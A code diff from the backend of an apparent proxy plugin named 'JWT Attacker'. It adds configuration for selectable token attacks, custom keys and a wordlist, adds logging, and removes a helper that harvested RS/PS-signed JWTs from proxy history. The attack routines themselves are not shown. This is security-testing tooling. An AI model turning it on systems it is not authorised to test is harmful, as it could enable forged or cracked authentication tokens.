+    enabledAttacks[k] = hasAnyFlag ? rawEnabled[k] === true : true;
+  }
+  return {
+    jwksUrl: typeof c.jwksUrl === "string" ? c.jwksUrl : "",
+    customPublicKeyPem: typeof c.customPublicKeyPem === "string" ? c.customPublicKeyPem : "",
+    customPrivateKeyPem: typeof c.customPrivateKeyPem === "string" ? c.customPrivateKeyPem : "",
+    customCertPem: typeof c.customCertPem === "string" ? c.customCertPem : "",
+    extraJwksPaths: Array.isArray(c.extraJwksPaths) ? c.extraJwksPaths : [],
+    customWordlist: Array.isArray(c.customWordlist) ? c.customWordlist : [],
+    enabledAttacks
+  };
 }
 function findJWTsInSpec(spec) {
   const locations = [];
@@ -1496,34 +1392,11 @@ function flattenHeaders(headers) {
   }
   return out;
 }
-async function collectHistoryJWTs(sdk, host, limit) {
-  const results = [];
-  try {
-    const page = await sdk.requests.query().descending("req", "id").first(limit).execute();
-    const conn = page;
-    for (const item of conn.items ?? []) {
-      if (!item.request || item.request.getHost() !== host) continue;
-      const spec = item.request.toSpec();
-      const locs = findJWTsInSpec(spec);
-      for (const loc of locs) {
-        try {
-          const parsed = parseJWT(loc.jwt);
-          const fam = getAlgorithmFamily(parsed.header.alg);
-          if (fam === "RS" || fam === "PS") {
-            results.push(parsed);
-            if (results.length >= 10) return results;
-          }
-        } catch {
-        }
-      }
-    }
-  } catch {
-  }
-  return results;
-}
 function init(sdk) {
+  sdk.console.log("[JWT Attacker] backend init() called");
   sdk.api.register("attackJwt", attackJwt);
   sdk.api.register("getJWTsInRequest", getJWTsInRequest);
+  sdk.console.log("[JWT Attacker] backend init() complete");
 }
 export {
   init
